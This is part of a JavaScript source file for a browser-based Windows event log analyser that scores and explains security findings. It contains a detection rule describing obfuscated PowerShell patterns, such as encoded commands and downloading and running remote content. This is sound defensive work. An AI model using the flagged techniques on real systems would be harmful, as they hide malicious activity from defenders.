        computers: computersOf([e]),
        observed: 'A PowerShell script block contained patterns commonly used to hide what a command does — for example encoded ' +
                  'commands, Base64 decoding, or downloading and running remote content.',
        why: 'PowerShell itself is a normal administration tool and its use is not suspicious. Heavily encoded or obfuscated script ' +
             'blocks are, however, a common technique for hiding activity from casual inspection. Script block logging must be ' +
             'enabled in advance for these events to exist at all.',
        benign: [
          'A legitimate administration script that wraps a long command in Base64 for convenience.',
          'Deployment or configuration-management tooling that encodes scripts.',
          'A vendor installer or management agent that uses encoded commands.'
        ],
        investigation: [
          'Decode the Base64 content and read what the script actually does before judging it.',
          'Identify which process or user launched PowerShell, and from which directory.',
          'Check whether the script contacts the network and, if so, where.',
          'Confirm whether the account and host normally run such scripts.',
          'Review endpoint protection logs for the same host and time.'
        ],
        points: 10,
        scoreLabel: 'Obfuscated PowerShell command'
      }));
    });
  }

  /* ---------------------------------------------------------------------
     10. Analysis: run every rule, build statistics and the investigation
     score. The score is simply the sum of the points of the findings that
     fired, capped at 100 — there is no hidden weighting anywhere.
     --------------------------------------------------------------------- */
  function countEventId(events, id) {
    var n = 0;
    for (var i = 0; i < events.length; i++) if (events[i].eventId === id) n++;
    return n;
  }

  function topCounts(entries, limit) {
    return Object.keys(entries)
      .map(function (key) { return { label: key, count: entries[key] }; })
      .sort(function (a, b) { return b.count - a.count || a.label.localeCompare(b.label); })
      .slice(0, limit);
  }

  function countMap(events, keyFn) {
    var map = {};
    events.forEach(function (e) {
      var key = keyFn(e);
      if (!key) return;
      map[key] = (map[key] || 0) + 1;
    });
    return map;
  }

  function scoreLabelFor(score) {
    if (score === 0) return 'Baseline — no notable indicators detected';
    if (score < 20) return 'Low investigative priority';
    if (score < 45) return 'Elevated activity';
    if (score < 70) return 'Notable activity';
    return 'High investigative priority';
  }
  function scoreColorFor(score) {
    if (score < 20) return 'var(--low)';
    if (score < 45) return 'var(--medium)';
    return 'var(--high)';
  }

  function analyse(events, settings) {
    var findings = [];
    var notes = [];

    var consumed = rulesFailedLogons(events, settings, findings, notes);
    var consumedCreated = ruleAccountCreatedThenPrivileged(events, settings, findings);
    Object.keys(consumedCreated).forEach(function (k) { consumed[k] = true; });
    rulesAccountStandalone(events, findings, consumed);
    rulesPrivilegeStandalone(events, settings, findings, consumed);
    ruleAuditLogCleared(events, findings);
    rulesServiceAndPowerShell(events, findings);

    findings.sort(function (a, b) {
      var d = SEVERITY_ORDER[b.severity] - SEVERITY_ORDER[a.severity];
      return d !== 0 ? d : b.points - a.points;
    });

    var stats = {
      total: events.length,
      successfulLogons: countEventId(events, 4624),
      failedLogons: countEventId(events, 4625),
      accountsCreated: countEventId(events, 4720),
      accountsDeleted: countEventId(events, 4726),
      privilegeChanges: countEventId(events, 4728) + countEventId(events, 4732),
      logCleared: countEventId(events, 1102),
      processCreated: countEventId(events, 4688),
      servicesInstalled: countEventId(events, 7045),
      powershellScripts: countEventId(events, 4104),
      unrecognised: events.filter(function (e) { return !e.known; }).length,
      uniqueAccounts: Object.keys(countMap(events, function (e) { return e.accountKey; })).length,
      findingsRequiringAttention: findings.filter(function (f) {
        return f.severity === 'Medium' || f.severity === 'High';
      }).length
    };

    var rawScore = 0;
    findings.forEach(function (f) { rawScore += f.points; });
    var score = Math.min(100, rawScore);

    var topAccounts = topCounts(countMap(events, function (e) { return e.account || 'Not recorded'; }), 10);
    var failedOnly = events.filter(function (e) { return e.eventId === 4625; });
    var topFailedAccounts = topCounts(countMap(failedOnly, function (e) { return e.account || 'Not recorded'; }), 10);

    var eventIdCounts = countMap(events, function (e) { return String(e.eventId); });
    var topEventIds = topCounts(eventIdCounts, 10).map(function (item) {
      var meta = EVENT_CATALOG[parseInt(item.label, 10)];
      return { label: item.label + '  ' + (meta ? meta.name : 'Unrecognised'), count: item.count };
    });

    var categoryCounts = topCounts(countMap(events, function (e) { return e.category; }), 12);

    /* Rule 5: administrative / privilege activity summary (no score impact) */
    var adminActivity = [
      { title: 'Accounts created (Event 4720)', events: events.filter(function (e) { return e.eventId === 4720; }) },
      { title: 'Privileged group changes (Events 4728 / 4732)', events: events.filter(function (e) { return e.eventId === 4728 || e.eventId === 4732; }) },
      { title: 'Services installed (Event 7045)', events: events.filter(function (e) { return e.eventId === 7045; }) },
      { title: 'Security audit log cleared (Event 1102)', events: events.filter(function (e) { return e.eventId === 1102; }) },
      { title: 'PowerShell script blocks (Event 4104)', events: events.filter(function (e) { return e.eventId === 4104; }) }
    ];

    /* Timeline: known events with an investigative priority of Low or above */
    var timeline = events.filter(function (e) {
      return e.known && e.time && SEVERITY_ORDER[e.severity] >= SEVERITY_ORDER.Low;
    }).sort(byTimeAscending).slice(0, 80);

    var timesAvailable = events.some(function (e) { return !!e.time; });

    return {
      findings: findings,
      stats: stats,
      score: score,
      rawScore: rawScore,
      scoreLabel: scoreLabelFor(score),
      scoreColor: scoreColorFor(score),
      topAccounts: topAccounts,
      topFailedAccounts: topFailedAccounts,
      topEventIds: topEventIds,
      categoryCounts: categoryCounts,
      adminActivity: adminActivity,
      timeline: timeline,
      timesAvailable: timesAvailable,
      notes: notes
    };
  }

  /* ---------------------------------------------------------------------
     11. Rendering
     --------------------------------------------------------------------- */
  function makeCard(label, value, note, modifier) {
    return el('div', { class: 'card' + (modifier ? ' ' + modifier : '') }, [
      el('p', { class: 'card-label', text: label }),
      el('p', { class: 'card-value', text: value }),
      note ? el('p', { class: 'card-note', text: note }) : null
    ]);
  }

  function renderSummary(report) {
    var host = $('summary-cards');
    clear(host);
    var s = report.stats;
    var cards = [
      makeCard('Total events', nf(s.total), null, 'card-accent'),
      makeCard('Findings to investigate', nf(s.findingsRequiringAttention), 'Medium or High priority', s.findingsRequiringAttention > 0 ? 'card-high' : 'card-low'),
      makeCard('Successful logons', nf(s.successfulLogons), 'Event 4624'),
      makeCard('Failed logons', nf(s.failedLogons), 'Event 4625', s.failedLogons > 0 ? 'card-medium' : null),
      makeCard('Accounts created', nf(s.accountsCreated), 'Event 4720', s.accountsCreated > 0 ? 'card-medium' : null),
      makeCard('Privilege changes', nf(s.privilegeChanges), 'Events 4728 / 4732', s.privilegeChanges > 0 ? 'card-medium' : null),
      makeCard('Audit log cleared', nf(s.logCleared), 'Event 1102', s.logCleared > 0 ? 'card-high' : null),
      makeCard('Process creations', nf(s.processCreated), 'Event 4688'),
      makeCard('Services installed', nf(s.servicesInstalled), 'Event 7045'),
      makeCard('Unique accounts', nf(s.uniqueAccounts), 'Seen in this dataset'),
      makeCard('Unrecognised Event IDs', nf(s.unrecognised), 'Counted, never flagged')
    ];
    appendAll(host, cards);
  }

  function renderScore(report) {
    var dial = $('score-dial');
    var degrees = Math.round((report.score / 100) * 360);
    dial.style.setProperty('--score-deg', degrees + 'deg');
    dial.style.setProperty('--score-color', report.scoreColor);
    dial.setAttribute('aria-label', 'Investigation score ' + report.score + ' out of 100: ' + report.scoreLabel);
    $('score-number').textContent = String(report.score);
    $('score-label').textContent = report.scoreLabel;

    var list = $('score-breakdown');
    clear(list);

    if (!report.findings.length) {
      list.appendChild(el('li', {}, [
        el('span', { text: 'No finding contributed any points. That does not prove the activity was harmless — it means nothing in this dataset matched the tool\'s rules.' }),
        el('span', { class: 'pts zero', text: '+0' })
      ]));
    } else {
      report.findings.forEach(function (f) {
        list.appendChild(el('li', {}, [
          el('span', { text: f.scoreLabel + ' — ' + f.severity + ' priority' }),
          el('span', { class: 'pts', text: '+' + f.points })
        ]));
      });
      list.appendChild(el('li', {}, [
        el('span', { class: 'score-total', text: 'Total (capped at 100)' }),
        el('span', { class: 'pts score-total', text: report.score + (report.rawScore > 100 ? '  (raw ' + report.rawScore + ')' : '') })
      ]));
    }

    if (report.notes && report.notes.length) {
      report.notes.forEach(function (note) {
        list.appendChild(el('li', {}, [
          el('span', { class: 'empty-note', text: 'Note: ' + note }),
          el('span', { class: 'pts zero', text: '—' })
        ]));
      });
    }
  }

  function sevClass(severity) {
    return 'sev sev-' + String(severity || 'informational').toLowerCase();
  }
  function sevVar(severity) {
    return 'var(--' + String(severity || 'informational').toLowerCase() + ')';
  }

  function metaItem(label, value) {
    return el('div', {}, [
      el('b', { text: label + ': ' }),
      document.createTextNode(value)
    ]);
  }

  function renderFindings(report) {
    var host = $('findings');
    clear(host);

    if (!report.findings.length) {
      host.appendChild(el('p', { class: 'empty-note', text:
        'No findings were raised for this dataset. That is a normal result for routine activity — it is not a guarantee that ' +
        'nothing untoward happened, because the tool can only see the events you gave it and the rules it knows about.' }));
      return;
    }

    report.findings.forEach(function (f) {
      var blocks = [];

      blocks.push(el('div', { class: 'finding-block' }, [
        el('h4', { text: 'Observed activity' }),
        el('p', { text: f.observed })
      ]));

      if (f.sequence) {
        blocks.push(el('div', { class: 'finding-block' }, [
          el('h4', { text: 'Event sequence' }),
          el('p', {}, [el('span', { class: 'seq', text: f.sequence })])
        ]));
      }

      blocks.push(el('div', { class: 'finding-block' }, [
        el('h4', { text: 'Why this could matter' }),
        el('p', { text: f.why })
      ]));

      blocks.push(el('div', { class: 'finding-block' }, [
        el('h4', { text: 'Possible benign explanations' }),
        el('ul', {}, f.benign.map(function (b) { return el('li', { text: b }); }))
      ]));

      blocks.push(el('div', { class: 'finding-block' }, [
        el('h4', { text: 'Suggested investigation' }),
        el('ol', {}, f.investigation.map(function (step) { return el('li', { text: step }); }))
      ]));

      host.appendChild(el('article', {
        class: 'finding',
        style: '--sev-color: ' + sevVar(f.severity)
      }, [
        el('div', { class: 'finding-top' }, [
          el('h3', { class: 'finding-title', text: f.title }),
          el('span', { class: sevClass(f.severity), text: f.severity })
        ]),
        el('div', { class: 'finding-meta' }, [
          metaItem('Event ID', f.eventIds.join(', ') || 'n/a'),
          metaItem('Account', f.account || 'Not recorded'),
          metaItem('Time', f.timeRange || 'Not available'),
          metaItem('Source IP', f.sourceIps.length ? f.sourceIps.join(', ') : 'Not present in data'),
          metaItem('Computer', f.computers.length ? f.computers.join(', ') : 'Not present in data'),
          metaItem('Score contribution', '+' + f.points + ' points')
        ])
      ].concat(blocks)));
    });
  }

  function renderAdminActivity(report) {
    var host = $('admin-activity');
    clear(host);

    var total = 0;
    report.adminActivity.forEach(function (group) { total += group.events.length; });

    if (!total) {
      host.appendChild(el('p', { class: 'empty-note', text:
        'No account creation, privilege change, service installation, log-clearing or PowerShell script-block events were found in this dataset.' }));
      return;
    }

    report.adminActivity.forEach(function (group) {
      var card = el('div', { class: 'admin-group' }, [
        el('h3', { text: group.title + ' — ' + group.events.length })
      ]);
      if (!group.events.length) {
        card.appendChild(el('p', { class: 'empty-note', text: 'None in this dataset.' }));
      } else {
        card.appendChild(el('ul', {}, group.events.slice(0, 25).map(function (e) {
          var parts = [];
          if (e.time) parts.push(formatTime(e.time));
          else if (e.timeRaw) parts.push(e.timeRaw);
          parts.push(e.account ? 'account: ' + e.account : 'account: not recorded');
          if (e.actor && e.actor !== e.account) parts.push('performed by: ' + e.actor);
          if (e.groupName) parts.push('group: ' + e.groupName);
          if (e.serviceName) parts.push('service: ' + e.serviceName);
          if (e.computer) parts.push('host: ' + e.computer);
          return el('li', { text: parts.join('  ·  ') });
        })));
        if (group.events.length > 25) {
          card.appendChild(el('p', { class: 'empty-note', text: 'Showing the first 25 of ' + group.events.length + '.' }));
        }
      }
      host.appendChild(card);
    });

    host.appendChild(el('p', { class: 'empty-note', text:
      'These items are listed together because they all change what an account or system can do. They are not automatically ' +
      'linked to each other — treat each entry on its own merits and look for a change record.' }));
  }

  function renderBars(hostId, items, emptyText) {
    var host = $(hostId);
    clear(host);
    if (!items || !items.length) {
      host.appendChild(el('p', { class: 'empty-note', text: emptyText || 'No data in this dataset.' }));
      return;
    }
    var max = items[0].count || 1;
    items.forEach(function (item) {
      var width = Math.max(2, Math.round((item.count / max) * 100));
      host.appendChild(el('div', { class: 'bar-row' }, [
        el('span', { class: 'bar-label', text: item.label }),
        el('span', { class: 'bar-value', text: String(item.count) }),
        el('div', { class: 'bar-track' }, [
          el('div', { class: 'bar-fill' + (item.modifier ? ' ' + item.modifier : ''), style: 'width:' + width + '%' })
        ])
      ]));
    });
  }

  function renderCharts(report) {
    renderBars('chart-accounts', report.topAccounts, 'No account names could be read from this dataset.');
    renderBars('chart-failed', report.topFailedAccounts, 'No failed logon events (4625) in this dataset.');
    renderBars('chart-eventids', report.topEventIds, 'No events to summarise.');
    renderBars('chart-types', report.categoryCounts, 'No event types to summarise.');
  }

  function renderTimeline(report) {
    var host = $('timeline');
    var sub = $('timeline-sub');
    clear(host);

    if (!report.timesAvailable) {
      sub.textContent = 'Timeline unavailable.';
      host.appendChild(el('p', { class: 'empty-note', text:
        'The timeline needs readable timestamps. This export did not contain a date/time column the tool could parse, so events ' +
        'are reported without chronological ordering. All other analysis still works.' }));
      return;
    }

    sub.textContent = 'Events with an investigative priority of Low or above, ordered by time. Informational events (such as ' +
                      'routine successful logons) are intentionally left out to keep the timeline readable.';

    if (!report.timeline.length) {
      host.appendChild(el('p', { class: 'empty-note', text:
        'No events above Informational priority were found, so there is nothing to plot. The full event list is below.' }));
      return;
    }

    report.timeline.forEach(function (e) {
      var detail = e.eventId + ' ' + e.name;
      if (e.account) detail += ' — ' + e.account;
      if (e.groupName) detail += ' (group: ' + e.groupName + ')';
      if (e.sourceIp) detail += ' from ' + e.sourceIp;
      host.appendChild(el('div', { class: 'tl-item', style: '--sev-color: ' + sevVar(e.severity) }, [
        el('div', { class: 'tl-time', text: formatTime(e.time) + '  ·  ' + e.severity }),
        el('div', { class: 'tl-text' }, [el('b', { text: detail })])
      ]));
    });

    if (report.timeline.length >= 80) {
      host.appendChild(el('p', { class: 'empty-note', text: 'Showing the first 80 noteworthy events by time.' }));
    }
  }

  /* ---- Event table, filters and search ---- */
  var state = {
    events: [],
    report: null,
    settings: null,
    filters: { search: '', eventId: '', account: '', severity: '', type: '', sourceIp: '' },
    visibleRows: MAX_ROWS_PER_PAGE,
    demoLabel: null,
    sourceName: null
  };

  function filteredEvents() {
    var f = state.filters;
    var needle = f.search.trim().toLowerCase();
    return state.events.filter(function (e) {
      if (f.eventId && String(e.eventId) !== f.eventId) return false;
      if (f.account && (e.account || 'Not recorded') !== f.account) return false;
      if (f.severity && e.severity !== f.severity) return false;
      if (f.type && e.category !== f.type) return false;
      if (f.sourceIp && (e.sourceIp || 'Not present') !== f.sourceIp) return false;
      if (needle) {
        var haystack = [
          e.eventId, e.name, e.account, e.actor, e.computer, e.sourceIp, e.provider,
          e.groupName, e.serviceName, e.processName, e.message
        ].filter(Boolean).join(' ').toLowerCase();
        if (haystack.indexOf(needle) === -1) return false;
      }
      return true;
    });
  }

  function truncate(text, length) {
    var t = String(text == null ? '' : text).replace(/\s+/g, ' ').trim();
    if (t.length <= length) return t;
    return t.slice(0, length - 1) + '…';
  }

  function renderTable() {
    var tbody = $('events-tbody');
    clear(tbody);

    var rows = filteredEvents();
    var shown = rows.slice(0, state.visibleRows);

    shown.forEach(function (e) {
      tbody.appendChild(el('tr', {}, [
        el('td', { class: 'cell-id', text: String(e.index) }),
        el('td', { class: 'cell-time', text: e.time ? formatTime(e.time) : (e.timeRaw || '—') }),
        el('td', { class: 'cell-id', text: String(e.eventId) }),
        el('td', { text: e.name }),
        el('td', {}, [el('span', { class: sevClass(e.severity), text: e.severity })]),
        el('td', { text: e.account || '—' }),
        el('td', { text: e.sourceIp || '—' }),
        el('td', { text: e.computer || '—' }),
        el('td', { class: 'cell-msg', text: truncate(e.message, 160) })
      ]));
    });

    $('table-count').textContent = 'Showing ' + shown.length + ' of ' + rows.length +
      ' matching event' + (rows.length === 1 ? '' : 's') +
      ' (dataset contains ' + state.events.length + ').';

    var more = $('show-more');
    if (rows.length > shown.length) {
      more.hidden = false;
      more.textContent = 'Show ' + Math.min(MAX_ROWS_PER_PAGE, rows.length - shown.length) + ' more rows';
    } else {
      more.hidden = true;
    }
  }

  function fillSelect(selectId, values, allLabel) {
    var select = $(selectId);
    var previous = select.value;
    clear(select);
    select.appendChild(el('option', { value: '', text: allLabel }));
    values.forEach(function (v) {
      select.appendChild(el('option', { value: v, text: v }));
    });
    if (values.indexOf(previous) !== -1) select.value = previous;
  }

  function populateFilters() {
    var ids = [], accounts = [], severities = [], types = [], ips = [];
    var seen = { id: {}, account: {}, severity: {}, type: {}, ip: {} };

    state.events.forEach(function (e) {
      var id = String(e.eventId);
      if (!seen.id[id]) { seen.id[id] = 1; ids.push(id); }
      var account = e.account || 'Not recorded';
      if (!seen.account[account]) { seen.account[account] = 1; accounts.push(account); }
      if (!seen.severity[e.severity]) { seen.severity[e.severity] = 1; severities.push(e.severity); }
      if (!seen.type[e.category]) { seen.type[e.category] = 1; types.push(e.category); }
      var ip = e.sourceIp || 'Not present';
      if (!seen.ip[ip]) { seen.ip[ip] = 1; ips.push(ip); }
    });

    ids.sort(function (a, b) { return parseInt(a, 10) - parseInt(b, 10); });
    accounts.sort();
    severities.sort(function (a, b) {
      return (SEVERITY_ORDER[b] === undefined ? -1 : SEVERITY_ORDER[b]) -
             (SEVERITY_ORDER[a] === undefined ? -1 : SEVERITY_ORDER[a]);
    });
    types.sort();
    ips.sort();

    fillSelect('f-eventid', ids, 'All Event IDs');
    fillSelect('f-account', accounts, 'All accounts');
    fillSelect('f-severity', severities, 'All severities');
    fillSelect('f-type', types, 'All event types');
    fillSelect('f-sourceip', ips, 'All source IPs');
  }

  function renderReferenceTable() {
    var tbody = $('ref-tbody');
    if (!tbody) return;
    clear(tbody);
    Object.keys(EVENT_CATALOG).sort(function (a, b) { return a - b; }).forEach(function (id) {
      var meta = EVENT_CATALOG[id];
      tbody.appendChild(el('tr', {}, [
        el('td', { text: id }),
        el('td', { text: meta.name }),
        el('td', { text: meta.plain }),
        el('td', {}, [el('span', { class: sevClass(meta.severity), text: meta.severity })])
      ]));
    });
  }

  /* ---------------------------------------------------------------------
     12. UI wiring
     --------------------------------------------------------------------- */
  var SAMPLE_INFO = {
    normal: { file: 'normal-windows-events.csv', title: 'Normal Windows activity' },
    passwordGuessing: { file: 'password-guessing.csv', title: 'Password guessing followed by success' },
    accountPersistence: { file: 'account-persistence.csv', title: 'Account creation and privilege escalation' },
    suspiciousAdmin: { file: 'suspicious-admin-activity.csv', title: 'Mixed SOC lab activity' }
  };

  var MAX_FILE_BYTES = 25 * 1024 * 1024;     /* 25 MB */
  var WARN_FILE_BYTES = 8 * 1024 * 1024;     /* 8 MB  */

  function showStatus(kind, title, metaPairs, warnings, notes) {
    var host = $('load-status');
    clear(host);
    host.className = 'load-status ' + kind;
    host.hidden = false;
    host.appendChild(el('h3', { text: title }));

    if (metaPairs && metaPairs.length) {
      host.appendChild(el('div', { class: 'meta' }, metaPairs.map(function (pair) {
        return el('span', {}, [el('b', { text: pair[0] + ': ' }), document.createTextNode(pair[1])]);
      })));
    }
    if (warnings && warnings.length) {
      host.appendChild(el('p', { style: 'margin-top:.6rem' }, [
        el('b', { text: 'Things the tool could not read (analysis continued without them):' })
      ]));
      host.appendChild(el('ul', {}, warnings.map(function (w) { return el('li', { text: w }); })));
    }
    if (notes && notes.length) {
      host.appendChild(el('ul', {}, notes.map(function (n) { return el('li', { text: n }); })));
    }
  }

  function hideResults() { $('results').hidden = true; }

  function renderAll(report) {
    renderSummary(report);
    renderScore(report);
    renderFindings(report);
    renderAdminActivity(report);
    renderCharts(report);
    renderTimeline(report);
    populateFilters();
    renderTable();
    $('results').hidden = false;
  }

  /* demoKey is null for uploaded files, or one of SAMPLE_INFO's keys. */
  function runAnalysis(text, sourceName, demoKey) {
    var parsed = parseEventFile(text);
    var isDemo = !!demoKey;

    if (!parsed.ok) {
      state.events = [];
      state.report = null;
      hideResults();
      showStatus('err', 'Could not analyse this file', [['File', sourceName || 'Unknown']],
        [parsed.error], null);
      return;
    }

    state.events = parsed.events;
    state.sourceName = sourceName || 'Unknown';
    state.demoLabel = isDemo;
    state.visibleRows = MAX_ROWS_PER_PAGE;
    state.filters = { search: '', eventId: '', account: '', severity: '', type: '', sourceIp: '' };
    resetFilterControls();

    var report = analyse(parsed.events, state.settings);
    state.report = report;
    renderAll(report);

    var meta = [
      ['Source', state.sourceName + (isDemo ? '  (Demo Data — fictional)' : '')],
      ['Events loaded', String(parsed.events.length)],
      ['Data rows in file', String(parsed.totalRows)],
      ['Parsed', 'Successfully']
    ];
    Object.keys(parsed.columns || {}).forEach(function (key) {
      meta.push(['Column used for ' + key, parsed.columns[key]]);
    });

    var title = isDemo ? 'Demo data loaded — ' + SAMPLE_INFO[demoKey].title : 'File parsed successfully';

    showStatus((parsed.warnings && parsed.warnings.length) ? 'warn' : 'ok', title, meta,
               parsed.warnings, parsed.notes);

    $('report-context').textContent = 'Analysis of ' + state.sourceName +
      (isDemo ? ' (Demo Data — fictional, safe sample)' : '') + ' — ' +
      plural(parsed.events.length, 'event', 'events') + ' parsed, ' +
      plural(report.findings.length, 'finding', 'findings') + ' raised. ' +
      'Investigation score ' + report.score + '/100 (' + report.scoreLabel + ').';

    $('results').scrollIntoView({ behavior: 'smooth', block: 'start' });
  }

  function resetFilterControls() {
    $('f-search').value = '';
    ['f-eventid', 'f-account', 'f-severity', 'f-type', 'f-sourceip'].forEach(function (id) {
      $(id).value = '';
    });
  }

  /* ---- File handling ---- */
  function handleFile(file) {
    if (!file) return;
    var name = file.name || 'unnamed file';
    var looksCsv = /\.(csv|txt)$/i.test(name) ||
                   file.type === 'text/csv' || file.type === 'text/plain' || file.type === '';

    if (!looksCsv) {
      hideResults();
      showStatus('err', 'That file type is not supported', [['File', name]],
        ['Please export the events as CSV from Windows Event Viewer and upload the .csv file. ' +
         'Raw .evtx files are not supported in this version.'], null);
      return;
    }
    if (file.size > MAX_FILE_BYTES) {
      hideResults();
      showStatus('err', 'That file is too large for browser-based analysis', [
        ['File', name],
        ['Size', (file.size / 1024 / 1024).toFixed(1) + ' MB']
      ], ['Please filter the events in Event Viewer to a smaller time range before exporting. ' +
          'Everything runs in this browser tab, so very large files are better narrowed down first.'], null);
      return;
    }

    var reader = new FileReader();
    reader.onerror = function () {
      hideResults();
      showStatus('err', 'The file could not be read', [['File', name]],
        ['The browser reported an error while reading the file. It may be open in another program, or the download may be incomplete.'], null);
    };
    reader.onload = function () {
      var text = String(reader.result || '');
      runAnalysis(text, name, null);
      if (file.size > WARN_FILE_BYTES) {
        var host = $('load-status');
        if (host && !host.hidden) {
          host.appendChild(el('ul', {}, [
            el('li', { text: 'This file was fairly large (' + (file.size / 1024 / 1024).toFixed(1) +
                             ' MB). Parsing may have taken a few seconds.' })
          ]));
        }
      }
    };
    reader.readAsText(file);
  }

  /* ---- Settings ---- */
  function clampInt(value, min, max, fallback) {
    var n = parseInt(value, 10);
    if (isNaN(n)) return fallback;
    if (n < min) return min;
    if (n > max) return max;
    return n;
  }

  function readSettingsFromForm() {
    state.settings = {
      failedLoginThreshold: clampInt($('set-failed').value, 1, 10000, DEFAULT_SETTINGS.failedLoginThreshold),
      failedLoginWindowMinutes: clampInt($('set-window').value, 0, 1440, DEFAULT_SETTINGS.failedLoginWindowMinutes),
      privilegeChangeThreshold: clampInt($('set-priv').value, 1, 1000, DEFAULT_SETTINGS.privilegeChangeThreshold)
    };
    writeSettingsToForm();
  }

  function writeSettingsToForm() {
    $('set-failed').value = state.settings.failedLoginThreshold;
    $('set-window').value = state.settings.failedLoginWindowMinutes;
    $('set-priv').value = state.settings.privilegeChangeThreshold;
  }

  function reanalyse() {
    if (!state.events.length) {
      showStatus('warn', 'No data loaded yet', null,
        ['Load a CSV file or a demo dataset first, and then the thresholds will be applied to it.'], null);
      return;
    }
    var report = analyse(state.events, state.settings);
    state.report = report;
    state.visibleRows = MAX_ROWS_PER_PAGE;
    renderAll(report);
    $('report-context').textContent = 'Re-analysed ' + state.sourceName +
      (state.demoLabel ? ' (Demo Data — fictional, safe sample)' : '') + ' with thresholds: failed logons ≥ ' +
      state.settings.failedLoginThreshold + ', window ' + state.settings.failedLoginWindowMinutes +
      ' min, privilege changes ≥ ' + state.settings.privilegeChangeThreshold + '. ' +
      plural(report.findings.length, 'finding', 'findings') + ' raised. Investigation score ' +
      report.score + '/100 (' + report.scoreLabel + ').';
  }

  /* ---- Wiring ---- */
  function wireDropzone() {
    var zone = $('dropzone');
    var input = $('file-input');

    zone.addEventListener('click', function () { input.click(); });
    zone.addEventListener('keydown', function (event) {
      if (event.key === 'Enter' || event.key === ' ' || event.key === 'Spacebar') {
        event.preventDefault();
        input.click();
      }
    });
    input.addEventListener('change', function () {
      if (input.files && input.files[0]) handleFile(input.files[0]);
      input.value = '';
    });

    ['dragenter', 'dragover'].forEach(function (type) {
      zone.addEventListener(type, function (event) {
        event.preventDefault();
        event.stopPropagation();
        zone.classList.add('is-dragover');
      });
    });
    ['dragleave', 'dragend'].forEach(function (type) {
      zone.addEventListener(type, function (event) {
        event.preventDefault();
        event.stopPropagation();
        zone.classList.remove('is-dragover');
      });
    });
    zone.addEventListener('drop', function (event) {
      event.preventDefault();
      event.stopPropagation();
      zone.classList.remove('is-dragover');
      var files = event.dataTransfer && event.dataTransfer.files;
      if (files && files.length) handleFile(files[0]);
    });

    /* Stop the browser navigating away when a file is dropped elsewhere */
    ['dragover', 'drop'].forEach(function (type) {
      window.addEventListener(type, function (event) { event.preventDefault(); });
    });
  }

  function wireDemoButtons() {
    Array.prototype.forEach.call(document.querySelectorAll('[data-demo]'), function (button) {
      button.addEventListener('click', function () {
        var key = button.getAttribute('data-demo');
        var csv = SAMPLE_CSV[key];
        if (!csv) {
          showStatus('err', 'Demo dataset unavailable', null,
            ['The embedded copy of this sample could not be found.'], null);
          return;
        }
        runAnalysis(csv, SAMPLE_INFO[key].file, key);
      });
    });
  }

  function wireSettings() {
    $('apply-settings').addEventListener('click', function () {
      readSettingsFromForm();
      reanalyse();
    });
    $('reset-settings').addEventListener('click', function () {
      state.settings = {
        failedLoginThreshold: DEFAULT_SETTINGS.failedLoginThreshold,
        failedLoginWindowMinutes: DEFAULT_SETTINGS.failedLoginWindowMinutes,
        privilegeChangeThreshold: DEFAULT_SETTINGS.privilegeChangeThreshold
      };
      writeSettingsToForm();
      reanalyse();
    });
  }

  function wireFilters() {
    var search = $('f-search');
    search.addEventListener('input', function () {
      state.filters.search = search.value;
      state.visibleRows = MAX_ROWS_PER_PAGE;
      renderTable();
    });
    [['f-eventid', 'eventId'], ['f-account', 'account'], ['f-severity', 'severity'],
     ['f-type', 'type'], ['f-sourceip', 'sourceIp']].forEach(function (pair) {
      $(pair[0]).addEventListener('change', function (event) {
        state.filters[pair[1]] = event.target.value;
        state.visibleRows = MAX_ROWS_PER_PAGE;
        renderTable();
      });
    });
    $('clear-filters').addEventListener('click', function () {
      state.filters = { search: '', eventId: '', account: '', severity: '', type: '', sourceIp: '' };
      resetFilterControls();
      state.visibleRows = MAX_ROWS_PER_PAGE;
      renderTable();
    });
    $('show-more').addEventListener('click', function () {
      state.visibleRows += MAX_ROWS_PER_PAGE;
      renderTable();
    });
  }

  function init() {
    state.settings = {
      failedLoginThreshold: DEFAULT_SETTINGS.failedLoginThreshold,
      failedLoginWindowMinutes: DEFAULT_SETTINGS.failedLoginWindowMinutes,
      privilegeChangeThreshold: DEFAULT_SETTINGS.privilegeChangeThreshold
    };
    writeSettingsToForm();
    renderReferenceTable();
    wireDropzone();
    wireDemoButtons();
    wireSettings();
    wireFilters();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
